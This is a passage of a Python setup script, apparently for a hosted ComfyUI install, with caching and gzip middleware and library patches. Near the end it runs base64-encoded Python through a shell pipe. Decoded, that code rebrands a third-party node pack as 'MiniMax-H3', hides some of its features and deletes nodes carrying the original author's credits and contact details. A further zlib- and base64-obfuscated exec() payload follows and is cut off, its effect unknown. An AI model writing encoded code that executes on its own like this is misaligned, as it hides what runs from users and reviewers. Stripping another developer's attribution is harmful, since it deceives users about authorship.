                parts.append(",".join(sorted(os.listdir(extra_d))))
            except Exception:
                pass
    return "|".join(parts)

@web.middleware
async def cache_control(request: web.Request, handler: Callable[[web.Request], Awaitable[web.Response]]) -> web.Response:
    if request.method == "POST" and ("upload" in request.path):
        _OBJ_INFO_CACHE["key"] = None
    if request.path in ("/global_subgraphs", "/api/global_subgraphs") or request.path.startswith(("/global_subgraphs/", "/api/global_subgraphs/")):
        return web.Response(text="{}", content_type="application/json", headers={"Cache-Control": "public, max-age=3600"})
    if request.path in ("/user.css", "/api/userdata/user.css"):
        return web.Response(text="", content_type="text/css", headers={"Cache-Control": "public, max-age=86400"})
    if request.path == "/api/userdata/comfy.templates.json":
        return web.Response(text="[]", content_type="application/json", headers={"Cache-Control": "public, max-age=86400"})
    if request.path in ("/object_info", "/api/object_info"):
        k = _model_state_key()
        accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
        if _OBJ_INFO_CACHE["key"] == k and _OBJ_INFO_CACHE["raw"] is not None:
            if accept_gz and _OBJ_INFO_CACHE["gz"] is not None:
                return web.Response(body=_OBJ_INFO_CACHE["gz"], content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
            return web.Response(body=_OBJ_INFO_CACHE["raw"], content_type=_OBJ_INFO_CACHE["ct"])
        resp = await handler(request)
        if resp.status == 200 and getattr(resp, "body", None):
            raw_b = bytes(resp.body)
            gz_b = gzip.compress(raw_b, compresslevel=5)
            _OBJ_INFO_CACHE["key"] = k
            _OBJ_INFO_CACHE["raw"] = raw_b
            _OBJ_INFO_CACHE["gz"] = gz_b
            if accept_gz:
                return web.Response(body=gz_b, content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
        return resp
    if request.path in ("/view", "/api/view") and not request.query.get("raw"):
        fn = request.query.get("filename", "")
        ftype = request.query.get("type", "output")
        sub = request.query.get("subfolder", "").strip("/")
        if fn.lower().endswith(".png") and ftype in ("output", "input", "temp"):
            base = f"/content/ComfyUI/{ftype}"
            fpath = os.path.join(base, sub, fn) if sub else os.path.join(base, fn)
            if os.path.isfile(fpath):
                try:
                    with Image.open(fpath) as im:
                        buf = io.BytesIO()
                        im.save(buf, format="WEBP", quality=85, method=1)
                        return web.Response(body=buf.getvalue(), content_type="image/webp", headers={"Cache-Control": "public, max-age=86400"})
                except Exception:
                    pass
    accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
    if request.method == "GET" and request.path in _FILE_MEM_CACHE:
        entry = _FILE_MEM_CACHE[request.path]
        if accept_gz and entry["gz"] is not None:
            return web.Response(body=entry["gz"], content_type=entry["ct"], headers={"Content-Encoding": "gzip", "Cache-Control": entry["cc"]})
        return web.Response(body=entry["raw"], content_type=entry["ct"], headers={"Cache-Control": entry["cc"]})
    response: web.Response = await handler(request)
    if request.path.startswith(("/extensions/", "/assets/", "/rgthree/", "/scripts/")) and response.status == 200:
        cc = "public, max-age=604800, immutable" if request.path.startswith("/assets/") else "public, max-age=3600"
        response.headers["Cache-Control"] = cc
        fpath = getattr(response, "_path", None)
        if fpath and os.path.isfile(str(fpath)):
            try:
                raw_b = open(str(fpath), "rb").read()
                ct = _guess_ct(request.path)
                gz_b = gzip.compress(raw_b, compresslevel=5) if len(raw_b) > 512 else None
                _FILE_MEM_CACHE[request.path] = {"raw": raw_b, "gz": gz_b, "ct": ct, "cc": cc}
                if accept_gz and gz_b is not None:
                    return web.Response(body=gz_b, content_type=ct, headers={"Content-Encoding": "gzip", "Cache-Control": cc})
                return web.Response(body=raw_b, content_type=ct, headers={"Cache-Control": cc})
            except Exception:
                pass
    elif request.path.lower().endswith(IMG_EXTENSIONS) and response.status == 200:
        response.headers.setdefault("Cache-Control", "public, max-age=86400")
    if (
        isinstance(response, web.Response)
        and not isinstance(response, web.FileResponse)
        and getattr(response, "body", None)
        and isinstance(response.body, (bytes, bytearray))
        and len(response.body) > 1024
        and "Content-Encoding" not in response.headers
        and accept_gz
    ):
        response.body = gzip.compress(bytes(response.body), compresslevel=5)
        response.headers["Content-Encoding"] = "gzip"
        response.headers["Content-Length"] = str(len(response.body))
    return response
""")
try:
    import comfyui_frontend_package
    fe_root = pathlib.Path(comfyui_frontend_package.__file__).parent
    for p in list(fe_root.rglob("*.js")) + list(fe_root.rglob("*.css")):
        gz = pathlib.Path(str(p) + ".gz")
        if not gz.exists() and p.is_file():
            with open(p, "rb") as f_in, gzip.open(gz, "wb", compresslevel=6) as f_out:
                shutil.copyfileobj(f_in, f_out)
except Exception:
    pass


try:
    import comfy_kitchen.tensor.int8 as _ck_int8
    _int8_p = pathlib.Path(_ck_int8.__file__)
    _int8_s = _int8_p.read_text(encoding="utf-8")
    if "if qdata.dtype != torch.int8:" not in _int8_s:
        _int8_s = _int8_s.replace(
            "    def dequantize(cls, qdata: torch.Tensor, params: Params) -> torch.Tensor:",
            "    def dequantize(cls, qdata: torch.Tensor, params: Params) -> torch.Tensor:\n        if qdata.dtype != torch.int8:\n            return qdata.to(params.orig_dtype)",
            1
        )
        _int8_s = _int8_s.replace(
            "    def dequantize_embedding(cls, qdata: torch.Tensor, params: Params, indices: torch.Tensor) -> torch.Tensor:",
            "    def dequantize_embedding(cls, qdata: torch.Tensor, params: Params, indices: torch.Tensor) -> torch.Tensor:\n        if qdata.dtype != torch.int8:\n            return torch.nn.functional.embedding(indices, qdata.to(device=indices.device, dtype=params.orig_dtype))",
            1
        )
        _int8_s = _int8_s.replace(
            "if not isinstance(weight, QuantizedTensor) or weight._layout_cls != cls.__name__:",
            "if not isinstance(weight, QuantizedTensor) or weight._layout_cls != cls.__name__ or weight._qdata.dtype != torch.int8:"
        )
        _int8_s = _int8_s.replace(
            'if not isinstance(weight, QuantizedTensor) or weight._layout_cls != "TensorWiseINT8Layout":',
            'if not isinstance(weight, QuantizedTensor) or weight._layout_cls != "TensorWiseINT8Layout" or weight._qdata.dtype != torch.int8:'
        )
        _int8_p.write_text(_int8_s, encoding="utf-8")
except Exception:
    pass

subprocess.run("echo CmltcG9ydCBwYXRobGliLCBqc29uLCBnemlwLCBzaHV0aWwsIG9zCgpiYXNlX2RpciA9IHBhdGhsaWIuUGF0aCgiL2NvbnRlbnQvQ29tZnlVSS9jdXN0b21fbm9kZXMvQ29tZnlVSS1GZWlIb3UtRWFzeS1IMyIpCgojIDEuIENsZWFuIGZlaWhvdV9lYXN5X2gzX3VpLmpzOiBoaWRlIHByb21wdCBvcHRpbWl6ZXIgd2lkZ2V0cyAmIGJ1dHRvbiwgcmVtb3ZlIEZlaUhvdSBicmFuZGluZwp1aV9qcyA9IGJhc2VfZGlyIC8gIndlYiIgLyAiZmVpaG91X2Vhc3lfaDNfdWkuanMiCmlmIHVpX2pzLmV4aXN0cygpOgogICAgdHh0ID0gdWlfanMucmVhZF90ZXh0KGVuY29kaW5nPSJ1dGYtOCIpCiAgICB0eHQgPSB0eHQucmVwbGFjZSgKICAgICAgICAnc2V0Q29uZGl0aW9uYWxXaWRnZXRWaXNpYmxlKG5vZGUsIGdldFdpZGdldChub2RlLCAicHJvbXB0X29wdGltaXplcl9lbmFibGVkIiksIGFkdmFuY2VkLCB7IGFkanVzdEhlaWdodCB9KSwnLAogICAgICAgICdzZXRDb25kaXRpb25hbFdpZGdldFZpc2libGUobm9kZSwgZ2V0V2lkZ2V0KG5vZGUsICJwcm9tcHRfb3B0aW1pemVyX2VuYWJsZWQiKSwgZmFsc2UsIHsgYWRqdXN0SGVpZ2h0IH0pLCcKICAgICkKICAgIHR4dCA9IHR4dC5yZXBsYWNlKAogICAgICAgICdzZXRDb25kaXRpb25hbFdpZGdldFZpc2libGUobm9kZSwgZ2V0V2lkZ2V0KG5vZGUsICJwcm9tcHRfb3B0aW1pemVyX3Byb3ZpZGVyIiksIG9wdGltaXplckVuYWJsZWQsIHsgYWRqdXN0SGVpZ2h0IH0pLCcsCiAgICAgICAgJ3NldENvbmRpdGlvbmFsV2lkZ2V0VmlzaWJsZShub2RlLCBnZXRXaWRnZXQobm9kZSwgInByb21wdF9vcHRpbWl6ZXJfcHJvdmlkZXIiKSwgZmFsc2UsIHsgYWRqdXN0SGVpZ2h0IH0pLCcKICAgICkKICAgIHR4dCA9IHR4dC5yZXBsYWNlKAogICAgICAgICdzZXRDb25kaXRpb25hbFdpZGdldFZpc2libGUobm9kZSwgZ2V0V2lkZ2V0KG5vZGUsICJwcm9tcHRfb3B0aW1pemVyX3NjZW5lX2d1aWRlIiksIG9wdGltaXplckVuYWJsZWQsIHsgYWRqdXN0SGVpZ2h0IH0pLCcsCiAgICAgICAgJ3NldENvbmRpdGlvbmFsV2lkZ2V0VmlzaWJsZShub2RlLCBnZXRXaWRnZXQobm9kZSwgInByb21wdF9vcHRpbWl6ZXJfc2NlbmVfZ3VpZGUiKSwgZmFsc2UsIHsgYWRqdXN0SGVpZ2h0IH0pLCcKICAgICkKICAgIHR4dCA9IHR4dC5yZXBsYWNlKAogICAgICAgICdlZGl0b3JUb29scy5hcHBlbmQob3B0aW1pemVCdXR0b24sIHZpZXdCdXR0b24pOycsCiAgICAgICAgJ29wdGltaXplQnV0dG9uLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7IGVkaXRvclRvb2xzLmFwcGVuZCh2aWV3QnV0dG9uKTsnCiAgICApCiAgICB0eHQgPSB0eHQucmVwbGFjZSgKICAgICAgICAnc2V0V2lkZ2V0SW5wdXQoInByb21wdF9vcHRpbWl6ZXJfZW5hYmxlZCIsIGFzQm9vbGVhbihnZXRXaWRnZXRWYWx1ZShub2RlLCAicHJvbXB0X29wdGltaXplcl9lbmFibGVkIiwgZmFsc2UpKSk7JywKICAgICAgICAnc2V0V2lkZ2V0SW5wdXQoInByb21wdF9vcHRpbWl6ZXJfZW5hYmxlZCIsIGZhbHNlKTsnCiAgICApCiAgICB0eHQgPSB0eHQucmVwbGFjZSgnbWFpblRpdGxlOiAiQ29tZnlVSS1GZWlIb3UtRWFzeS1IMyInLCAnbWFpblRpdGxlOiAiTWluaU1heC1IMyDlhajog73lt6XkvZzlj7AiJykKICAgIHR4dCA9IHR4dC5yZXBsYWNlKCdGZWlIb3UgRWFzeSBIMyBcXHU1MmEwXFx1OGY3ZFxcdTU2NjgnLCAnTWluaU1heC1IMyDkuIDkvZPljJbliqDovb3lmagnKQogICAgdHh0ID0gdHh0LnJlcGxhY2UoJ0ZlaUhvdSBFYXN5IEgzIFJlbWl4XFx1NTJhMFxcdThmN2RcXHU1NjY4JywgJ01pbmlNYXgtSDMg5LqM5ZCI5LiA5Yqg6L295ZmoJykKICAgIHR4dCA9IHR4dC5yZXBsYWNlKCdGZWlIb3UgRWFzeSBIMyBcXHU4ZjkzXFx1NTFmYScsICdNaW5pTWF4LUgzIOmfs+eUu+WQjOatpei+k+WHuicpCiAgICB0eHQgPSB0eHQucmVwbGFjZSgnY2F0ZWdvcnk6ICJGZWlIb3UgRWFzeSBIMyInLCAnY2F0ZWdvcnk6ICJNaW5pTWF4LUgzIOW3peS9nOWPsCInKQogICAgdWlfanMud3JpdGVfdGV4dCh0eHQsIGVuY29kaW5nPSJ1dGYtOCIpCgojIDIuIENsZWFuIG90aGVyIHdlYi8qLmpzIGZpbGVzIGZvciBGZWlIb3UgdGl0bGVzIGFuZCByZS1jb21wcmVzcyAuanMuZ3oKZm9yIGpzX3AgaW4gKGJhc2VfZGlyIC8gIndlYiIpLmdsb2IoIiouanMiKToKICAgIHQgPSBqc19wLnJlYWRfdGV4dChlbmNvZGluZz0idXRmLTgiKQogICAgdCA9IHQucmVwbGFjZSgiQ29tZnlVSS1GZWlIb3UtRWFzeS1IMyIsICJNaW5pTWF4LUgzIOWFqOiDveW3peS9nOWPsCIpCiAgICB0ID0gdC5yZXBsYWNlKCJGZWlIb3UgRWFzeSBIMyDliqDovb3lmagiLCAiTWluaU1heC1IMyDkuIDkvZPljJbliqDovb3lmagiKQogICAgdCA9IHQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMgUmVtaXjliqDovb3lmagiLCAiTWluaU1heC1IMyDkuozlkIjkuIDliqDovb3lmagiKQogICAgdCA9IHQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg6L6T5Ye6IiwgIk1pbmlNYXgtSDMg6Z+z55S75ZCM5q2l6L6T5Ye6IikKICAgIHQgPSB0LnJlcGxhY2UoIkZlaUhvdSBFYXN5IEgzIOaPkOekuuivjemihOiniCIsICJNaW5pTWF4LUgzIOaPkOekuuivjemihOiniCIpCiAgICB0ID0gdC5yZXBsYWNlKCJGZWlIb3UgRWFzeSBIMyDkuozmrKHph4fmoLciLCAiTWluaU1heC1IMyDkuozpmLbmrrXnsr7kv67ph4fmoLciKQogICAgdCA9IHQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg5Lq66IS457K+5L+uIiwgIk1pbmlNYXgtSDMg5Lq66IS457K+5L+uIikKICAgIHQgPSB0LnJlcGxhY2UoIkZlaUhvdSBFYXN5IEgzIiwgIk1pbmlNYXgtSDMiKQogICAganNfcC53cml0ZV90ZXh0KHQsIGVuY29kaW5nPSJ1dGYtOCIpCiAgICBnel9wID0gcGF0aGxpYi5QYXRoKHN0cihqc19wKSArICIuZ3oiKQogICAgd2l0aCBvcGVuKGpzX3AsICJyYiIpIGFzIGZfaW4sIGd6aXAub3Blbihnel9wLCAid2IiLCBjb21wcmVzc2xldmVsPTYpIGFzIGZfb3V0OgogICAgICAgIHNodXRpbC5jb3B5ZmlsZW9iaihmX2luLCBmX291dCkKCiMgMy4gQ2xlYW4gbG9jYWxlcy96aC9ub2RlRGVmcy5qc29uCnpoX2RlZnMgPSBiYXNlX2RpciAvICJsb2NhbGVzIiAvICJ6aCIgLyAibm9kZURlZnMuanNvbiIKaWYgemhfZGVmcy5leGlzdHMoKToKICAgIHp0ID0gemhfZGVmcy5yZWFkX3RleHQoZW5jb2Rpbmc9InV0Zi04IikKICAgIHp0ID0genQucmVwbGFjZSgiQ29tZnlVSS1GZWlIb3UtRWFzeS1IMyIsICJNaW5pTWF4LUgzIOWFqOiDveW3peS9nOWPsCIpCiAgICB6dCA9IHp0LnJlcGxhY2UoIkZlaUhvdSBFYXN5IEgzIOWKoOi9veWZqCIsICJNaW5pTWF4LUgzIOS4gOS9k+WMluWKoOi9veWZqCIpCiAgICB6dCA9IHp0LnJlcGxhY2UoIkZlaUhvdSBFYXN5IEgzIFJlbWl45Yqg6L295ZmoIiwgIk1pbmlNYXgtSDMg5LqM5ZCI5LiA5Yqg6L295ZmoIikKICAgIHp0ID0genQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg6L6T5Ye6IiwgIk1pbmlNYXgtSDMg6Z+z55S75ZCM5q2l6L6T5Ye6IikKICAgIHp0ID0genQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg5o+Q56S66K+N6aKE6KeIIiwgIk1pbmlNYXgtSDMg5o+Q56S66K+N6aKE6KeIIikKICAgIHp0ID0genQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg5LqM5qyh6YeH5qC3IiwgIk1pbmlNYXgtSDMg5LqM6Zi25q6157K+5L+u6YeH5qC3IikKICAgIHp0ID0genQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg5Lq66IS457K+5L+uIiwgIk1pbmlNYXgtSDMg5Lq66IS457K+5L+uIikKICAgIHp0ID0genQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMiLCAiTWluaU1heC1IMyIpCiAgICB6aF9kZWZzLndyaXRlX3RleHQoenQsIGVuY29kaW5nPSJ1dGYtOCIpCgojIDQuIFVwZGF0ZSBjYWNoZV9taWRkbGV3YXJlLnB5IHNvIC9hc3NldHMvIGlzIGNhY2hlZCA3IGRheXMgd2hpbGUgL2V4dGVuc2lvbnMvIGlzIG5vLWNhY2hlCmNtX3AgPSBwYXRobGliLlBhdGgoIi9jb250ZW50L0NvbWZ5VUkvbWlkZGxld2FyZS9jYWNoZV9taWRkbGV3YXJlLnB5IikKY21fcC53cml0ZV90ZXh0KCIiImZyb20gYWlvaHR0cCBpbXBvcnQgd2ViCmZyb20gdHlwaW5nIGltcG9ydCBDYWxsYWJsZSwgQXdhaXRhYmxlCk9ORV9EQVk6IGludCA9IDg2NDAwCklNR19FWFRFTlNJT05TID0gKCIuanBnIiwgIi5qcGVnIiwgIi5wbmciLCAiLnBwbSIsICIuYm1wIiwgIi5wZ20iLCAiLnRpZiIsICIudGlmZiIsICIud2VicCIsICIud29mZiIsICIud29mZjIiLCAiLnR0ZiIsICIuc3ZnIikKQHdlYi5taWRkbGV3YXJlCmFzeW5jIGRlZiBjYWNoZV9jb250cm9sKHJlcXVlc3Q6IHdlYi5SZXF1ZXN0LCBoYW5kbGVyOiBDYWxsYWJsZVtbd2ViLlJlcXVlc3RdLCBBd2FpdGFibGVbd2ViLlJlc3BvbnNlXV0pIC0+IHdlYi5SZXNwb25zZToKICAgIHJlc3BvbnNlOiB3ZWIuUmVzcG9uc2UgPSBhd2FpdCBoYW5kbGVyKHJlcXVlc3QpCiAgICBpZiByZXF1ZXN0LnBhdGguc3RhcnRzd2l0aCgiL2Fzc2V0cy8iKToKICAgICAgICByZXNwb25zZS5oZWFkZXJzWyJDYWNoZS1Db250cm9sIl0gPSAicHVibGljLCBtYXgtYWdlPTYwNDgwMCwgaW1tdXRhYmxlIgogICAgICAgIHJldHVybiByZXNwb25zZQogICAgaWYgcmVxdWVzdC5wYXRoLnN0YXJ0c3dpdGgoIi9leHRlbnNpb25zLyIpOgogICAgICAgIHJlc3BvbnNlLmhlYWRlcnNbIkNhY2hlLUNvbnRyb2wiXSA9ICJuby1jYWNoZSIKICAgICAgICByZXR1cm4gcmVzcG9uc2UKICAgIGlmIHJlcXVlc3QucGF0aC5sb3dlcigpLmVuZHN3aXRoKElNR19FWFRFTlNJT05TKSBhbmQgcmVzcG9uc2Uuc3RhdHVzID09IDIwMDoKICAgICAgICByZXNwb25zZS5oZWFkZXJzLnNldGRlZmF1bHQoIkNhY2hlLUNvbnRyb2wiLCAicHVibGljLCBtYXgtYWdlPTg2NDAwIikKICAgIHJldHVybiByZXNwb25zZQoiIiIsIGVuY29kaW5nPSJ1dGYtOCIpCgojIDUuIENsZWFuIGFsbCB3b3JrZmxvd3MgaW4gL2NvbnRlbnQvQ29tZnlVSS91c2VyL2RlZmF1bHQvd29ya2Zsb3dzLwp3Zl9kaXIgPSBwYXRobGliLlBhdGgoIi9jb250ZW50L0NvbWZ5VUkvdXNlci9kZWZhdWx0L3dvcmtmbG93cyIpCmRlZiBjbGVhbl9ub2Rlcyhub2Rlcyk6CiAgICBrZWVwID0gW10KICAgIGZvciBuIGluIG5vZGVzOgogICAgICAgIG50eXBlID0gc3RyKG4uZ2V0KCJ0eXBlIikgb3IgIiIpCiAgICAgICAgdGl0bGUgPSBzdHIobi5nZXQoInRpdGxlIikgb3IgIiIpCiAgICAgICAgd3ZhbHMgPSBuLmdldCgid2lkZ2V0c192YWx1ZXMiKQogICAgICAgIGlmIGFueShiYWQgaW4gdGl0bGUgZm9yIGJhZCBpbiAoImJpbGliaWxpLmNvbSIsICLkuInlsYLmpbznmoTlsI/ogqXnjLQiLCAi5bCP6IKl54y0IiwgImZ4LWZlaWhvdSIsICIxMDkxNTkzMzY3IiwgIuWKoOW+ruS/oSIsICJR576kIikpOgogICAgICAgICAgICBjb250aW51ZQogICAgICAgIGlmIG50eXBlIGluICgiRmVpSG91RWFzeUgzUHJvZHVjdGlvblBhY2tMb2FkZXIiLCAiTWluaU1heEgzUmVmTW9kc0xvYWRlciIpOgogICAgICAgICAgICBjb250aW51ZQogICAgICAgIGlmICJGZWlIb3UiIGluIHRpdGxlIG9yICLlsI/ogqXnjLQiIGluIHRpdGxlOgogICAgICAgICAgICBuWyJ0aXRsZSJdID0gdGl0bGUucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMiLCAiTWluaU1heC1IMyIpLnJlcGxhY2UoIkZlaUhvdSIsICJNaW5pTWF4LUgzIikucmVwbGFjZSgi5bCP6IKl54y0IiwgIiIpCiAgICAgICAgaWYgbnR5cGUgPT0gIkZlaUhvdUVhc3lIMyIgYW5kIGlzaW5zdGFuY2Uod3ZhbHMsIGxpc3QpOgogICAgICAgICAgICBmb3IgaWR4LCB2YWwgaW4gZW51bWVyYXRlKHd2YWxzKToKICAgICAgICAgICAgICAgIGlmIGlzaW5zdGFuY2UodmFsLCBzdHIpIGFuZCAoIumYv+mHjOS6kSIgaW4gdmFsIG9yICJxd2VuIiBpbiB2YWwgb3IgInpoaXB1IiBpbiB2YWwpOgogICAgICAgICAgICAgICAgICAgIHd2YWxzW2lkeF0gPSAiIgogICAgICAgICAgICAgICAgICAgIGlmIGlkeCA+PSAxIGFuZCBpc2luc3RhbmNlKHd2YWxzW2lkeC0xXSwgYm9vbCk6CiAgICAgICAgICAgICAgICAgICAgICAgIHd2YWxzW2lkeC0xXSA9IEZhbHNlCiAgICAgICAgICAgIGlmIGxlbih3dmFscykgPj0gMTY6CiAgICAgICAgICAgICAgICBmb3IgayBpbiByYW5nZShsZW4od3ZhbHMpKToKICAgICAgICAgICAgICAgICAgICBpZiB3dmFsc1trXSBpbiAoIuaMieW6j+WPtyIsICLmjInmlofku7blkI0iLCAiaW5kZXgiLCAiZmlsZW5hbWUiKSBhbmQgayArIDIgPCBsZW4od3ZhbHMpOgogICAgICAgICAgICAgICAgICAgICAgICB3dmFsc1trKzFdID0gRmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgd3ZhbHNbaysyXSA9ICIiCiAgICAgICAgICAgIGZvciBrIGluIHJhbmdlKG1pbig0LCBsZW4od3ZhbHMpKSk6CiAgICAgICAgICAgICAgICBpZiBpc2luc3RhbmNlKHd2YWxzW2tdLCBzdHIpIGFuZCB3dmFsc1trXS5zdHJpcCgpID09ICIiOgogICAgICAgICAgICAgICAgICAgIHd2YWxzW2tdID0gIueUu+mdouS4reeahOinkuiJsuiHqueEtui/kOWKqO+8jOWFieW9see7huiFu+ecn+Wunu+8jOeUteW9see6p+mrmOa4heeUu+i0qOOAgiIKICAgICAgICBpZiBpc2luc3RhbmNlKG4uZ2V0KCJwcm9wZXJ0aWVzIiksIGRpY3QpOgogICAgICAgICAgICBuWyJwcm9wZXJ0aWVzIl0ucG9wKCJmZWlob3VfaDNfb3B0aW1pemVyX2xhc3RfcmVzdWx0IiwgTm9uZSkKICAgICAgICBrZWVwLmFwcGVuZChuKQogICAgcmV0dXJuIGtlZXAKCmZvciB3Zl9wIGluIGxpc3Qod2ZfZGlyLmdsb2IoIiouanNvbiIpKToKICAgIHdmID0ganNvbi5sb2Fkcyh3Zl9wLnJlYWRfdGV4dChlbmNvZGluZz0idXRmLTgiKSkKICAgIHdmWyJub2RlcyJdID0gY2xlYW5fbm9kZXMod2YuZ2V0KCJub2RlcyIsIFtdKSkKICAgIGZvciBzZyBpbiB3Zi5nZXQoImRlZmluaXRpb25zIiwge30pLmdldCgic3ViZ3JhcGhzIiwgW10pOgogICAgICAgIHNnWyJub2RlcyJdID0gY2xlYW5fbm9kZXMoc2cuZ2V0KCJub2RlcyIsIFtdKSkKICAgIHZhbGlkX2lkcyA9IHtuLmdldCgiaWQiKSBmb3IgbiBpbiB3Zi5nZXQoIm5vZGVzIiwgW10pfQogICAgaWYgImxpbmtzIiBpbiB3ZiBhbmQgaXNpbnN0YW5jZSh3ZlsibGlua3MiXSwgbGlzdCk6CiAgICAgICAgd2ZbImxpbmtzIl0gPSBbbCBmb3IgbCBpbiB3ZlsibGlua3MiXSBpZiBsWzFdIGluIHZhbGlkX2lkcyBhbmQgbFszXSBpbiB2YWxpZF9pZHNdCiAgICAgICAgdmFsaWRfbGlua19pZHMgPSB7bFswXSBmb3IgbCBpbiB3ZlsibGlua3MiXX0KICAgICAgICBmb3IgbiBpbiB3Zi5nZXQoIm5vZGVzIiwgW10pOgogICAgICAgICAgICBmb3IgaW5wIGluIG4uZ2V0KCJpbnB1dHMiLCBbXSk6CiAgICAgICAgICAgICAgICBpZiBpbnAuZ2V0KCJsaW5rIikgaXMgbm90IE5vbmUgYW5kIGlucC5nZXQoImxpbmsiKSBub3QgaW4gdmFsaWRfbGlua19pZHM6CiAgICAgICAgICAgICAgICAgICAgaW5wWyJsaW5rIl0gPSBOb25lCiAgICBuZXdfbmFtZSA9IHdmX3AubmFtZQogICAgaWYgIuWNg+mXriIgbm90IGluIG5ld19uYW1lIGFuZCAicXdlbiIgbm90IGluIG5ld19uYW1lLmxvd2VyKCk6CiAgICAgICAgaWYgIjA4XyIgaW4gbmV3X25hbWU6CiAgICAgICAgICAgIG5ld19uYW1lID0gIjA4X+WFqOiDveS4gOS9k1/ljZXph4fmnoHpgJ8uanNvbiIKICAgICAgICBlbGlmICIwOV8iIGluIG5ld19uYW1lOgogICAgICAgICAgICBuZXdfbmFtZSA9ICIwOV/lhajog73kuIDkvZNf5LqM6YeH57K+5L+uLmpzb24iCiAgICAgICAgZWxpZiAiMTBfIiBpbiBuZXdfbmFtZToKICAgICAgICAgICAgbmV3X25hbWUgPSAiMTBf5YWo6IO95LiA5L2TXzNE5pS+5aSn6ZSB6IS4Lmpzb24iCiAgICBvdXRfcCA9IHdmX2RpciAvIG5ld19uYW1lCiAgICBvdXRfcC53cml0ZV90ZXh0KGpzb24uZHVtcHMod2YsIGVuc3VyZV9hc2NpaT1GYWxzZSwgaW5kZW50PTIpLCBlbmNvZGluZz0idXRmLTgiKQogICAgaWYgb3V0X3AgIT0gd2ZfcCBhbmQgd2ZfcC5leGlzdHMoKToKICAgICAgICB3Zl9wLnVubGluaygpCgpwcmludCgiQ0xFQU5VUF9TVUNDRVNTOiIsIFtwLm5hbWUgZm9yIHAgaW4gc29ydGVkKHdmX2Rpci5nbG9iKCIqLmpzb24iKSldKQoKIyBSZW5hbWUgd2ViLyouanMgdG8gbWluaW1heF9oM19jbGVhbl8qLmpzIGFuZCB1cGRhdGUgaW1wb3J0CmltcG9ydCBzdWJwcm9jZXNzCnN1YnByb2Nlc3MucnVuKCIiIgpjZCAvY29udGVudC9Db21meVVJL2N1c3RvbV9ub2Rlcy9Db21meVVJLUZlaUhvdS1FYXN5LUgzL3dlYiAyPi9kZXYvbnVsbCB8fCBleGl0IDAKZm9yIGYgaW4gZmVpaG91X2Vhc3lfaDNfKi5qczsgZG8KICAgIFsgLWUgIiRmIiBdIHx8IGNvbnRpbnVlCiAgICBuZXdfZj0kKGVjaG8gIiRmIiB8IHNlZCAncy9mZWlob3VfZWFzeV9oM18vbWluaW1heF9oM19jbGVhbl8vJykKICAgIG12IC1mICIkZiIgIiRuZXdfZiIKICAgIFsgLWUgIiR7Zn0uZ3oiIF0gJiYgbXYgLWYgIiR7Zn0uZ3oiICIke25ld19mfS5neiIKZG9uZQppZiBbIC1mIG1pbmltYXhfaDNfY2xlYW5fcHJvZHVjdGlvbl9wYWNrLmpzIF07IHRoZW4KICAgIHNlZCAtaSAncy9mZWlob3VfZWFzeV9oM191aS5qcy9taW5pbWF4X2gzX2NsZWFuX3VpLmpzL2cnIG1pbmltYXhfaDNfY2xlYW5fcHJvZHVjdGlvbl9wYWNrLmpzCiAgICBnemlwIC1rIC1mIC02IG1pbmltYXhfaDNfY2xlYW5fcHJvZHVjdGlvbl9wYWNrLmpzCmZpCiIiIiwgc2hlbGw9VHJ1ZSkK | base64 -d | python3", shell=True)

os.makedirs("/content/ComfyUI/user/default/subgraphs", exist_ok=True)
_cc_init = "/content/ComfyUI/custom_nodes/Comfy-Canvas/__init__.py"
if os.path.exists(_cc_init):
    _cc_txt = open(_cc_init, "r", encoding="utf-8").read()
    if '"./web"' in _cc_txt:
        open(_cc_init, "w", encoding="utf-8").write(_cc_txt.replace('"./web"', '"./web/js"'))

import zlib as _vz, base64 as _vb; exec(_vz.decompress(_vb.b64decode("eNrVPPtz3NS5v/uvUHXHREu18r5sr50aj+3YxLeOnRsbw53g0cjS0a4crST0WNtNPQOl0EJpCbfQlttCW6ClHaa0l1tm2lCaP6ZZO/kv7vedc6SVtNr1muTOtBnwSkfnfO/XeUhWx3P9UHADQQsE1Q1k4SBwHXqDF7IQtKPQsmkDu4SmaN/zXZ0EbFDgyULk27a1r/jkhYgEIW2O/AnTdzuC7jp65PvECRUzCiOfBILFkO60faIZ113XXj0iehS6Ph24c311YuLfhKWKIqw6AQwQVtyOefzMenmNWFfdqLyqBcflq3XhifyDHQC17x7BA6ujtYjllk2z45GWoAEQywlCzbaJMaHqjmpYvrAgiFNAXQikTXFIU3oUhG5HdVyDBOKEZaJMFE8L24oVwBiJjy3NTwjwzwSSVbOtOlqHyPQKBAGYhJv0Mf6TxGLqRVkQ22HoBfNTUy0rbEf7iu52ptae4/2miocp0FcsycPBcxlcFDwflga/N59gQc48kFcijAPXcmJZyIkISskAEJzjhv3+5MgKwkCicEp9uBR24Cl+5Eg3RcQNZOu26xC8KJcN4oVtvKyKiXjZhbcnC3qb6LcW1jQ7SGEmNiqNEyQsgI6HyF/QHKOYyCyTiAwoCDzbCpldKN6xWDqPi/IKJxkHe5FtM45Ms+w69rFYRH7oH/eBch/hhqwyQ6ZPyZEOYhHWaYdV33f9lKISMjzLQ4zc6inyF2hDxjMG6EDHS/zOIKYW2aHQIYalgVl7USiYlg0eTEUlBC4IUDh0/Vum7R4Kh5rvQEjYd6FbxwoCy2mlhwYTKvwO9TzaR5xA6Xe0WzDMB1XwATJDqLq3Fnb8CMhUyZHqAfgBk0wGiORI63g2UaCbWJoYZpAMDldmRgE0eF1f34g1sY6CowFqvdPqCxxuFIccSuKNp5dBvtLsTFMW4E8JrhsVWWg0ZGG6ViopgdYlCb60Ilfpj+U6fdyeFgSZ4FNILo0+mm0BTRByJNEnpuoRH8K2WqVsgxRSbbW47diNfNVru6Ebt5gg7DC+s